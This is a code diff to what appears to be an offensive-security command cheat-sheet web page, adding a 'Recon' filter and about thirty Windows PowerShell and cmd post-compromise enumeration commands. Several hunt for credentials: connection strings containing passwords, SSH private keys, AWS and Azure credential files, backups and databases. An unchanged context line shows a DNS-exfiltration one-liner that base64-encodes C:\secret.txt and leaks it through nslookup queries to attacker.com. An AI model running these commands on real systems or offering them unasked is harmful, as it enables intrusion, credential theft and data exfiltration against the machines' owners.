@@ -107,6 +107,8 @@
   .tag.lateral.active { background: #00bcd4; color: #fff; }
   .tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
   .tag.playbook.active { background: #ffeb3b; color: #000; }
+  .tag.recon { color: #4caf50; border-color: #4caf50; }
+  .tag.recon.active { background: #4caf50; color: #000; }
   .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
   .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
   .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
@@ -115,6 +117,7 @@
   .cmd-tag.postexploit { color: #ff9800; border-color: #ff9800; }
   .cmd-tag.lateral { color: #00bcd4; border-color: #00bcd4; }
   .cmd-tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
+  .cmd-tag.recon { color: #4caf50; border-color: #4caf50; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -226,6 +229,7 @@
   <div class="tag postexploit" data-filter="postexploit">Post-Exploit</div>
   <div class="tag lateral" data-filter="lateral">Lateral</div>
   <div class="tag playbook" data-filter="playbook">Playbook</div>
+  <div class="tag recon" data-filter="recon">Recon</div>
 </div>
 
 <div class="cmd-count" id="count">Loading...</div>
@@ -1458,6 +1462,186 @@ const COMMANDS = [
     code: "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\\\secret.txt'))\\n($d -split '(.{60})' | ?{$_}) | %{ nslookup \"$_.attacker.com\" }",
     tags: ["playbook", "postexploit", "c2"],
     accent: "#ff5722"
+  },
+  {
+    title: "Process List with Command Lines",
+    code: "Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine | Format-Table -Wrap",
+    tags: ["ps", "recon", "playbook"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Process List with Owner",
+    code: "Get-Process -IncludeUserName | Select-Object Name, Id, UserName, Path | Format-Table -AutoSize",
+    tags: ["ps", "recon", "playbook"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Services Running as SYSTEM",
+    code: "Get-WmiObject win32_service | Where-Object {$_.StartName -match 'LocalSystem'} | Select-Object Name, PathName, State",
+    tags: ["ps", "recon", "privesc"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Services with User Creds",
+    code: "Get-WmiObject win32_service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService' -and $_.StartName -ne $null} | Select-Object Name, StartName, PathName",
+    tags: ["ps", "recon", "privesc"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Listening Ports with PID",
+    code: "netstat -ano | findstr LISTENING",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Listening Ports + Process Name",
+    code: "Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess, @{n='Process';e={(Get-Process -Id $_.OwningProcess).Name}}",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Established Connections",
+    code: "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, @{n='Process';e={(Get-Process -Id $_.OwningProcess).Name}}",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Web Servers (Ports)",
+    code: "Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -in 80,443,8080,8443,8000,3000,5000} | Select-Object LocalPort, @{n='Proc';e={(Get-Process -Id $_.OwningProcess).Name}}",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "IIS Sites Enum",
+    code: "Import-Module WebAdministration; Get-WebSite | Select-Object Name, PhysicalPath",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Config Files",
+    code: "Get-ChildItem -Path C:\\\\ -Recurse -Include 'web.config','app.config','*.ini','appsettings.json' -ErrorAction SilentlyContinue 2>$null | Select-Object FullName",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Connection Strings",
+    code: "Get-ChildItem C:\\\\ -Recurse -Include '*.config','*.json' -EA SilentlyContinue | Select-String 'connectionString|password|pwd' | Select-Object Path,Line",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Installed Programs",
+    code: "Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion | Sort DisplayName",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Vuln Software",
+    code: "wmic product get name,version | findstr -i 'java apache tomcat jenkins jboss weblogic'",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Scheduled Tasks (3rd Party)",
+    code: "Get-ScheduledTask | Where-Object {$_.Author -notmatch 'Microsoft'} | Select-Object TaskName, Author",
+    tags: ["ps", "recon", "privesc"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Scheduled Tasks Paths",
+    code: "schtasks /query /fo LIST /v | findstr /i 'TaskName Task.To.Run'",
+    tags: ["cmd", "recon", "privesc"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Writable Dirs (Program Files)",
+    code: "icacls 'C:\\\\Program Files\\\\*' 2>nul | findstr /i '(F) (M) (W) Everyone Users'",
+    tags: ["cmd", "recon", "privesc"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Backup Files",
+    code: "Get-ChildItem C:\\\\ -Recurse -Include '*.bak','*.backup','*.old','*.save' -EA SilentlyContinue | Select-Object FullName",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Database Files",
+    code: "Get-ChildItem C:\\\\ -Recurse -Include '*.mdf','*.sqlite','*.db' -EA SilentlyContinue | Select-Object FullName",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Scripts",
+    code: "Get-ChildItem C:\\\\Users -Recurse -Include '*.ps1','*.bat','*.cmd','*.vbs' -EA SilentlyContinue | Select-Object FullName",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find SSH Keys",
+    code: "Get-ChildItem C:\\\\Users -Recurse -Include 'id_rsa','id_ed25519','*.pem','*.ppk' -EA SilentlyContinue | Select-Object FullName",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Cloud Creds",
+    code: "Get-ChildItem C:\\\\Users -Recurse -Include 'credentials','config' -Path '*\\\\.aws','*\\\\.azure' -EA SilentlyContinue",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Startup Programs",
+    code: "Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location",
+    tags: ["ps", "recon", "persist"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Registry Run Keys",
+    code: "Get-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run','HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -EA SilentlyContinue",
+    tags: ["ps", "recon", "persist"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "3rd Party Drivers",
+    code: "driverquery /v | findstr /v Microsoft",
+    tags: ["cmd", "recon", "privesc"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Hotfixes Installed",
+    code: "wmic qfe get HotFixID,InstalledOn,Description",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Named Pipes",
+    code: "[IO.Directory]::GetFiles('\\\\\\\\.\\\\pipe\\\\')",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "AntiVirus Product",
+    code: "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, productState",
+    tags: ["ps", "recon", "defender"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Environment Variables",
+    code: "Get-ChildItem Env: | Format-Table -Wrap",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Shares on This Machine",
+    code: "net share",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Mounted Drives",
+    code: "Get-PSDrive -PSProvider FileSystem | Select-Object Name, Root, Used, Free",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
   },
 ];
 
